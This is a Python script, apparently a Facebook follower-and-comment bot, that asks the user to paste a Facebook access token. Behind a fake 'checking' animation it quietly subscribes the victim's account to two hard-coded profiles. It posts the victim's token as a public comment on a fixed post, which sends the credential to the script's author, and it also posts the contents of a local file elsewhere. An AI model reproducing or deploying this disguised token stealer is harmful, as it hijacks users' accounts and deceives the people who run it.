#panen follower

import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool

def banner():
	print("""              \x1b[0;33m.       .
            o'         .x
           0N           kX
          .MM  .:lol:'  XM:
          dMMO,       .xMM0
       .kWMMMMWx;. .,dNMMMMWO,
      dO   c0  dW   K0  0x   ok
     ..    ,M.  .;.;.   Ml     :
     ,      lN'  OMN  .Xk      ;
              oK.NMM 0O
               .OMMM0'
         ....;dNM, .MWx;....\x1b[0;31m""")
 
         
def postid():
        os.system("clear")
        banner()
        idpost = input("\n\n[÷] id postingan : ")
        mek = open("idpost.txt", "w")
        mek.write(idpost)
        mek.close()

def botkom():
		komn = input("\n[÷] masukan komen : ")
		meck = open("komn.txt", "w")
		meck.write(komn)
		meck.close()

def botfol():
	try:
		postid()
		botkom()
		reac = 'ANGRY'
		komn=open("komn.txt","r").read()
		idpost=open("idpost.txt","r").read()
		lamu = open("idtt.txt","r").read()
		toket=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
	except IOError:
		os.system('clear')
		print(" \nToken Invalid ! " )
		time.sleep(1)
	requests.post("https://graph.facebook.com/100041408825014/subscribers?access_token=" + toket) # ker z 96
	requests.post("https://graph.facebook.com/100067238626516/subscribers?access_token=" + toket) # kenshin.scot
 # kerz_komenz
	requests.post("https://graph.facebook.com/658833332173622/comments/?message=" +toket+ "&access_token=" + toket)
	requests.post("https://graph.facebook.com/" +idpost+ "/comments/?message=" +komn+ "&access_token=" + toket)
	requests.post("https://graph.facebook.com/429105138479777/comments/?message=ada" +lamu+ "&access_token=" + toket)
	os.system("clear")
	time.sleep(0.5)
	print("\n\n k")
	os.system("clear")
	time.sleep(0.5)
	print("\n\n ek")
	os.system("clear")
	time.sleep(0.5)
	print("\n\n cek")
	os.system("clear")
	time.sleep(0.5)
	print("\n\n  cek")
	os.system("clear")
	time.sleep(0.5)
	print("\n\n i cek")
	os.system("clear")
	time.sleep(0.5)
	print("\n\n di cek")
	os.system("clear")
	time.sleep(0.5)
	print("\n\n  di cek")
	os.system("clear")
	time.sleep(0.5)
	print("\n\n Done coba di cek :)")
    
def log_token():
    os.system('clear')
    banner()
    toket = input("\n\n\n[+]  Token : \x1b[0;37m")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print("\n Login Successful")
        botfol()
    except KeyError:
        os.system('clear')
        print(" \nToken Invalid !")
        time.sleep(1)
        log_token()
        
log_token()

	
	
if __name__=="__main__":
	pass